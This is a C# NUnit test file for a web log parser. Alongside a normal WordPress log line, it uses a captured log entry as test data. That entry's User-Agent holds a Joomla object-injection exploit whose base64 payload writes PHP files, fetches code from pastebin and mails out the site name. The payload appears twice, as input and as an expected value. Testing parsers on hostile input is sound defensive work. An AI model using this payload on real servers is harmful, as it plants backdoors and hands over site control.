using NUnit.Framework;

namespace LogParser.Tests
{
    [TestFixture]
    public class ParserTests
    {
        private string _logrow =
                "66.175.239.30 - - [01/Jan/2018:00:30:40 -0500] \"POST /wp-cron.php?doing_wp_cron=1514784640.8263568878173828125000 HTTP/1.1\" 200 - missinglinksbrewery.com \"http://missinglinksbrewery.com/wp-cron.php?doing_wp_cron=1514784640.8263568878173828125000\" \"WordPress/4.9.1; http://missinglinksbrewery.com\" \"-\""
            ;

        private string _exploit = "5.62.41.2 - - [18/Jan/2018:08:06:32 -0500] \"GET / HTTP/1.1\" 503 299 missinglinksbrewery.com \"-\" \"}__test|O:21:\\\"JDatabaseDriverMysqli\\\":3:{s:2:\\\"fc\\\";O:17:\\\"JSimplepieFactory\\\":0:{}s:21:\\\"\\\\0\\\\0\\\\0disconnectHandlers\\\";a:1:{i:0;a:2:{i:0;O:9:\\\"SimplePie\\\":5:{s:8:\\\"sanitize\\\";O:20:\\\"JDatabaseDriverMysql\\\":0:{}s:8:\\\"feed_url\\\";s:3814:\\\"eval(base64_decode(\'JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvbGlicmFyaWVzL2pvb21sYS9sb2wucGhwIiA7DQokZnA9Zm9wZW4oIiRjaGVjayIsIncrIik7DQpmd3JpdGUoJGZwLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFOQ21aMWJtTjBhVzl1SUdoMGRIQmZaMlYwS0NSMWNtd3BldzBLQ1NScGJTQTlJR04xY214ZmFXNXBkQ2drZFhKc0tUc05DZ2xqZFhKc1gzTmxkRzl3ZENna2FXMHNJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc0lERXBPdzBLQ1dOMWNteGZjMlYwYjNCMEtDUnBiU3dnUTFWU1RFOVFWRjlEVDA1T1JVTlVWRWxOUlU5VlZDd2dNVEFwT3cwS0NXTjFjbXhmYzJWMGIzQjBLQ1JwYlN3Z1ExVlNURTlRVkY5R1QweE1UMWRNVDBOQlZFbFBUaXdnTVNrN0RRb0pZM1Z5YkY5elpYUnZjSFFvSkdsdExDQkRWVkpNVDFCVVgwaEZRVVJGVWl3Z01DazdEUW9KY21WMGRYSnVJR04xY214ZlpYaGxZeWdrYVcwcE93MEtDV04xY214ZlkyeHZjMlVvSkdsdEtUc05DbjBOQ2lSamFHVmpheUE5SUNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwyeHBZbkpoY21sbGN5OXFiMjl0YkdFdlkzTnpMbkJvY0NJZ093MEtKSFJsZUhRZ1BTQm9kSFJ3WDJkbGRDZ25hSFIwY0RvdkwzQmhjM1JsWW1sdUxtTnZiUzl5WVhjdk4xbFNVMkZNY1ZJbktUc05DaVJ2Y0dWdUlEMGdabTl3Wlc0b0pHTm9aV05yTENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0dWdUxDQWtkR1Y0ZENrN0RRcG1ZMnh2YzJVb0pHOXdaVzRwT3cwS2FXWW9abWxzWlY5bGVHbHpkSE1vSkdOb1pXTnJLU2w3RFFvZ0lDQWdaV05vYnlBa1kyaGxZMnN1SWp3dlluSStJanNOQ24xbGJITmxJQTBLSUNCbFkyaHZJQ0p1YjNRZ1pYaHBkSE1pT3cwS1pXTm9ieUFpWkc5dVpTQXVYRzRnSWlBN0RRb2tZMmhsWTJzeUlEMGdKRjlUUlZKV1JWSmJKMFJQUTFWTlJVNVVYMUpQVDFRblhTQXVJQ0l2YkdsaWNtRnlhV1Z6TDJwdmIyMXNZUzlxYldGcGJDNXdhSEFpSURzTkNpUjBaWGgwTWlBOUlHaDBkSEJmWjJWMEtDZG9kSFJ3T2k4dmNHRnpkR1ZpYVc0dVkyOXRMM0poZHk4NFNISlJZa3BOZHljcE93MEtKRzl3Wlc0eUlEMGdabTl3Wlc0b0pHTm9aV05yTWl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNCbGJqSXNJQ1IwWlhoME1pazdEUXBtWTJ4dmMyVW9KRzl3Wlc0eUtUc05DbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXpJcEtYc05DaUFnSUNCbFkyaHZJQ1JqYUdWamF6SXVJand2WW5JK0lqc05DbjFsYkhObElBMEtJQ0JsWTJodklDSnViM1FnWlhocGRITXlJanNOQ21WamFHOGdJbVJ2Ym1VeUlDNWNiaUFpSURzTkNnMEtKR05vWldOck16MGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTlsWnk1b2RHMGlJRHNOQ2lSMFpYaDBNeUE5SUdoMGRIQmZaMlYwS0Nkb2RIUndPaTh2Y0dGemRHVmlhVzR1WTI5dEwzSmhkeTg0WWxaelRqSjBXQ2NwT3cwS0pHOXdNejFtYjNCbGJpZ2tZMmhsWTJzekxDQW5keWNwT3cwS1puZHlhWFJsS0NSdmNETXNKSFJsZUhRektUc05DbVpqYkc5elpTZ2tiM0F6S1RzTkNnMEtKR05vWldOck5EMGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTlzYVdKeVlYSnBaWE12YW05dmJXeGhMMk5vWldOckxuQm9jQ0lnT3cwS0pIUmxlSFEwSUQwZ2FIUjBjRjluWlhRb0oyaDBkSEE2THk5d1lYTjBaV0pwYmk1amIyMHZjbUYzTDBJMmJtbFJhRWhqSnlrN0RRb2tiM0EwUFdadmNHVnVLQ1JqYUdWamF6UXNJQ2QzSnlrN0RRcG1kM0pwZEdVb0pHOXdOQ3drZEdWNGREUXBPdzBLWm1Oc2IzTmxLQ1J2Y0RRcE93MEtEUW9rWTJobFkyczFQU1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDJ4cFluSmhjbWxsY3k5cWIyOXRiR0V2YW0xaGFXeHpMbkJvY0NJZ093MEtKSFJsZUhRMUlEMGdhSFIwY0Y5blpYUW9KMmgwZEhBNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0x6aEljbEZpU2sxM0p5azdEUW9rYjNBMVBXWnZjR1Z1S0NSamFHVmphelVzSUNkM0p5azdEUXBtZDNKcGRHVW9KRzl3TlN3a2RHVjRkRFVwT3cwS1ptTnNiM05sS0NSdmNEVXBPdzBLRFFva1kyaGxZMnMyUFNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwyeHBZbkpoY21sbGN5OXFiMjl0YkdFdmMyVnpjMmx2Ymk5elpYTnphVzl1TG5Cb2NDSWdPdzBLSkhSbGVIUTJJRDBnYUhSMGNGOW5aWFFvSjJoMGRIQTZMeTl3WVhOMFpXSnBiaTVqYjIwdmNtRjNMMDV1ZW1jd1pVNVNKeWs3RFFva2IzQTJQV1p2Y0dWdUtDUmphR1ZqYXpZc0lDZDNKeWs3RFFwbWQzSnBkR1VvSkc5d05pd2tkR1Y0ZERZcE93MEtabU5zYjNObEtDUnZjRFlwT3cwS0RRb2tkRzk2SUQwZ0luTnBiRzUwYlRBd2RFQm5iV0ZwYkM1amIyMHNJR1ZuTG1oaFkyc3pRR2R0WVdsc0xtTnZiU0k3RFFva2MzVmlhbVZqZENBOUlDZEtiMjBnZW5wNklDY2dMaUFrWDFORlVsWkZVbHNuVTBWU1ZrVlNYMDVCVFVVblhUc05DaVJvWldGa1pYSWdQU0FuWm5KdmJUb2dSSEl1VTJsTWJsUWdTR2xzVENBOGMybHNiblJ0TURCMFFHZHRZV2xzTG1OdmJUNG5JQzRnSWx4eVhHNGlPdzBLSkcxbGMzTmhaMlVnUFNBaVUyaGxiR3g2SURvZ2FIUjBjRG92THlJZ0xpQWtYMU5GVWxaRlVsc25VMFZTVmtWU1gwNUJUVVVuWFNBdUlDSXZiR2xpY21GeWFXVnpMMnB2YjIxc1lTOXFiV0ZwYkM1d2FIQS9kU0lnTGlBaVhISmNiaUlnTGlCd2FIQmZkVzVoYldVb0tTQXVJQ0pjY2x4dUlqc05DaVJ6Wlc1MGJXRnBiQ0E5SUVCdFlXbHNLQ1IwYjNvc0lDUnpkV0pxWldOMExDQWtiV1Z6YzJGblpTd2dKR2hsWVdSbGNpazdEUW9OQ2tCMWJteHBibXNvWDE5R1NVeEZYMThwT3cwS0RRb05DajgrJykpOw0KZmNsb3NlKCRmcCk7\'));JFactory::getConfig();exit\\\";s:19:\\\"cache_name_function\\\";s:6:\\\"assert\\\";s:5:\\\"cache\\\";b:1;s:11:\\\"cache_class\\\";O:20:\\\"JDatabaseDriverMysql\\\":0:{}}i:1;s:4:\\\"init\\\";}}s:13:\\\"\\\\0\\\\0\\\\0connection\\\";b:1;}\\xf0\\xfd\\xfd\\xfd\" \"-\"";

        [Test]
        public void MatchLogRow()
        {
            var splitter = new LogRowParser();
            Assert.IsTrue(splitter.DoesEntryMatchPattern(_logrow));
        }

        [Test]
        public void ExploitRow()
        {
            // this test should fail, figure out how to parse with more accuracy
            var splitter = new LogRowParser();
            Assert.IsTrue(splitter.DoesEntryMatchPattern(_exploit));
        }

        [Test]
        public void ParseLogRow()
        {
            var splitter = new LogRowParser();
            var elements = splitter.ParseElements(_logrow);

            Assert.AreEqual("66.175.239.30", elements.IP,"ip failed");
            Assert.AreEqual("-",elements.Identity,"Identity failed");
            Assert.AreEqual("-",elements.UserId,"UserId failed");
            Assert.AreEqual("[01/Jan/2018:00:30:40", elements.Timestamp, "Timestamp failed");
            Assert.AreEqual("-0500]",elements.Offset,"Offset failed");
            Assert.AreEqual("\"POST /wp-cron.php?doing_wp_cron=1514784640.8263568878173828125000 HTTP/1.1\"",elements.RequestMessage, "RequestMessage failed");
            Assert.AreEqual("200", elements.StatusCode, "StatusCode failed");
            Assert.AreEqual("-", elements.Size, "Size failed");
            Assert.AreEqual("missinglinksbrewery.com", elements.Referer, "Referer failed");
            Assert.AreEqual("\"http://missinglinksbrewery.com/wp-cron.php?doing_wp_cron=1514784640.8263568878173828125000\"", elements.URL, "URL Failed");
            Assert.AreEqual("\"WordPress/4.9.1; http://missinglinksbrewery.com\"", elements.UserAgent, "UserAgent Failed");
            Assert.AreEqual("\"-\"", elements.Forwarded, "Forwarded failed");

            Assert.IsFalse(elements.Error);
        }

        [Test]
        public void ParseExploitRow()
        {
            var splitter = new LogRowParser();
            var elements = splitter.ParseElements(_exploit);

            Assert.AreEqual("5.62.41.2", elements.IP, "ip failed");
            Assert.AreEqual("-", elements.Identity, "Identity failed");
            Assert.AreEqual("-", elements.UserId, "UserId failed");
            Assert.AreEqual("[18/Jan/2018:08:06:32", elements.Timestamp, "Timestamp failed");
            Assert.AreEqual("-0500]", elements.Offset, "Offset failed");
            Assert.AreEqual("\"GET / HTTP/1.1\"", elements.RequestMessage, "RequestMessage failed");
            Assert.AreEqual("503", elements.StatusCode, "StatusCode failed");
            Assert.AreEqual("299", elements.Size, "Size failed");
            Assert.AreEqual("missinglinksbrewery.com", elements.Referer, "Referer failed");
            Assert.AreEqual("\"-\"", elements.URL, "URL Failed");

            Assert.AreEqual("\"}__test|O:21:\\\"", elements.UserAgent, "UserAgent Failed");
            Assert.AreEqual("JDatabaseDriverMysqli\\\":3:{s:2:\\\"fc\\\";O:17:\\\"JSimplepieFactory\\\":0:{}s:21:\\\"\\\\0\\\\0\\\\0disconnectHandlers\\\";a:1:{i:0;a:2:{i:0;O:9:\\\"SimplePie\\\":5:{s:8:\\\"sanitize\\\";O:20:\\\"JDatabaseDriverMysql\\\":0:{}s:8:\\\"feed_url\\\";s:3814:\\\"eval(base64_decode(\'JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvbGlicmFyaWVzL2pvb21sYS9sb2wucGhwIiA7DQokZnA9Zm9wZW4oIiRjaGVjayIsIncrIik7DQpmd3JpdGUoJGZwLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFOQ21aMWJtTjBhVzl1SUdoMGRIQmZaMlYwS0NSMWNtd3BldzBLQ1NScGJTQTlJR04xY214ZmFXNXBkQ2drZFhKc0tUc05DZ2xqZFhKc1gzTmxkRzl3ZENna2FXMHNJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc0lERXBPdzBLQ1dOMWNteGZjMlYwYjNCMEtDUnBiU3dnUTFWU1RFOVFWRjlEVDA1T1JVTlVWRWxOUlU5VlZDd2dNVEFwT3cwS0NXTjFjbXhmYzJWMGIzQjBLQ1JwYlN3Z1ExVlNURTlRVkY5R1QweE1UMWRNVDBOQlZFbFBUaXdnTVNrN0RRb0pZM1Z5YkY5elpYUnZjSFFvSkdsdExDQkRWVkpNVDFCVVgwaEZRVVJGVWl3Z01DazdEUW9KY21WMGRYSnVJR04xY214ZlpYaGxZeWdrYVcwcE93MEtDV04xY214ZlkyeHZjMlVvSkdsdEtUc05DbjBOQ2lSamFHVmpheUE5SUNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwyeHBZbkpoY21sbGN5OXFiMjl0YkdFdlkzTnpMbkJvY0NJZ093MEtKSFJsZUhRZ1BTQm9kSFJ3WDJkbGRDZ25hSFIwY0RvdkwzQmhjM1JsWW1sdUxtTnZiUzl5WVhjdk4xbFNVMkZNY1ZJbktUc05DaVJ2Y0dWdUlEMGdabTl3Wlc0b0pHTm9aV05yTENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0dWdUxDQWtkR1Y0ZENrN0RRcG1ZMnh2YzJVb0pHOXdaVzRwT3cwS2FXWW9abWxzWlY5bGVHbHpkSE1vSkdOb1pXTnJLU2w3RFFvZ0lDQWdaV05vYnlBa1kyaGxZMnN1SWp3dlluSStJanNOQ24xbGJITmxJQTBLSUNCbFkyaHZJQ0p1YjNRZ1pYaHBkSE1pT3cwS1pXTm9ieUFpWkc5dVpTQXVYRzRnSWlBN0RRb2tZMmhsWTJzeUlEMGdKRjlUUlZKV1JWSmJKMFJQUTFWTlJVNVVYMUpQVDFRblhTQXVJQ0l2YkdsaWNtRnlhV1Z6TDJwdmIyMXNZUzlxYldGcGJDNXdhSEFpSURzTkNpUjBaWGgwTWlBOUlHaDBkSEJmWjJWMEtDZG9kSFJ3T2k4dmNHRnpkR1ZpYVc0dVkyOXRMM0poZHk4NFNISlJZa3BOZHljcE93MEtKRzl3Wlc0eUlEMGdabTl3Wlc0b0pHTm9aV05yTWl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNCbGJqSXNJQ1IwWlhoME1pazdEUXBtWTJ4dmMyVW9KRzl3Wlc0eUtUc05DbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXpJcEtYc05DaUFnSUNCbFkyaHZJQ1JqYUdWamF6SXVJand2WW5JK0lqc05DbjFsYkhObElBMEtJQ0JsWTJodklDSnViM1FnWlhocGRITXlJanNOQ21WamFHOGdJbVJ2Ym1VeUlDNWNiaUFpSURzTkNnMEtKR05vWldOck16MGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTlsWnk1b2RHMGlJRHNOQ2lSMFpYaDBNeUE5SUdoMGRIQmZaMlYwS0Nkb2RIUndPaTh2Y0dGemRHVmlhVzR1WTI5dEwzSmhkeTg0WWxaelRqSjBXQ2NwT3cwS0pHOXdNejFtYjNCbGJpZ2tZMmhsWTJzekxDQW5keWNwT3cwS1puZHlhWFJsS0NSdmNETXNKSFJsZUhRektUc05DbVpqYkc5elpTZ2tiM0F6S1RzTkNnMEtKR05vWldOck5EMGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTlzYVdKeVlYSnBaWE12YW05dmJXeGhMMk5vWldOckxuQm9jQ0lnT3cwS0pIUmxlSFEwSUQwZ2FIUjBjRjluWlhRb0oyaDBkSEE2THk5d1lYTjBaV0pwYmk1amIyMHZjbUYzTDBJMmJtbFJhRWhqSnlrN0RRb2tiM0EwUFdadmNHVnVLQ1JqYUdWamF6UXNJQ2QzSnlrN0RRcG1kM0pwZEdVb0pHOXdOQ3drZEdWNGREUXBPdzBLWm1Oc2IzTmxLQ1J2Y0RRcE93MEtEUW9rWTJobFkyczFQU1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDJ4cFluSmhjbWxsY3k5cWIyOXRiR0V2YW0xaGFXeHpMbkJvY0NJZ093MEtKSFJsZUhRMUlEMGdhSFIwY0Y5blpYUW9KMmgwZEhBNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0x6aEljbEZpU2sxM0p5azdEUW9rYjNBMVBXWnZjR1Z1S0NSamFHVmphelVzSUNkM0p5azdEUXBtZDNKcGRHVW9KRzl3TlN3a2RHVjRkRFVwT3cwS1ptTnNiM05sS0NSdmNEVXBPdzBLRFFva1kyaGxZMnMyUFNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwyeHBZbkpoY21sbGN5OXFiMjl0YkdFdmMyVnpjMmx2Ymk5elpYTnphVzl1TG5Cb2NDSWdPdzBLSkhSbGVIUTJJRDBnYUhSMGNGOW5aWFFvSjJoMGRIQTZMeTl3WVhOMFpXSnBiaTVqYjIwdmNtRjNMMDV1ZW1jd1pVNVNKeWs3RFFva2IzQTJQV1p2Y0dWdUtDUmphR1ZqYXpZc0lDZDNKeWs3RFFwbWQzSnBkR1VvSkc5d05pd2tkR1Y0ZERZcE93MEtabU5zYjNObEtDUnZjRFlwT3cwS0RRb2tkRzk2SUQwZ0luTnBiRzUwYlRBd2RFQm5iV0ZwYkM1amIyMHNJR1ZuTG1oaFkyc3pRR2R0WVdsc0xtTnZiU0k3RFFva2MzVmlhbVZqZENBOUlDZEtiMjBnZW5wNklDY2dMaUFrWDFORlVsWkZVbHNuVTBWU1ZrVlNYMDVCVFVVblhUc05DaVJvWldGa1pYSWdQU0FuWm5KdmJUb2dSSEl1VTJsTWJsUWdTR2xzVENBOGMybHNiblJ0TURCMFFHZHRZV2xzTG1OdmJUNG5JQzRnSWx4eVhHNGlPdzBLSkcxbGMzTmhaMlVnUFNBaVUyaGxiR3g2SURvZ2FIUjBjRG92THlJZ0xpQWtYMU5GVWxaRlVsc25VMFZTVmtWU1gwNUJUVVVuWFNBdUlDSXZiR2xpY21GeWFXVnpMMnB2YjIxc1lTOXFiV0ZwYkM1d2FIQS9kU0lnTGlBaVhISmNiaUlnTGlCd2FIQmZkVzVoYldVb0tTQXVJQ0pjY2x4dUlqc05DaVJ6Wlc1MGJXRnBiQ0E5SUVCdFlXbHNLQ1IwYjNvc0lDUnpkV0pxWldOMExDQWtiV1Z6YzJGblpTd2dKR2hsWVdSbGNpazdEUW9OQ2tCMWJteHBibXNvWDE5R1NVeEZYMThwT3cwS0RRb05DajgrJykpOw0KZmNsb3NlKCRmcCk7\'));JFactory::getConfig();exit\\\";s:19:\\\"cache_name_function\\\";s:6:\\\"assert\\\";s:5:\\\"cache\\\";b:1;s:11:\\\"cache_class\\\";O:20:\\\"JDatabaseDriverMysql\\\":0:{}}i:1;s:4:\\\"init\\\";}}s:13:\\\"\\\\0\\\\0\\\\0connection\\\";b:1;}\\xf0\\xfd\\xfd\\xfd\"", elements.Forwarded, "Forwarded failed");

            Assert.IsTrue(elements.Error);

        }

    }
}
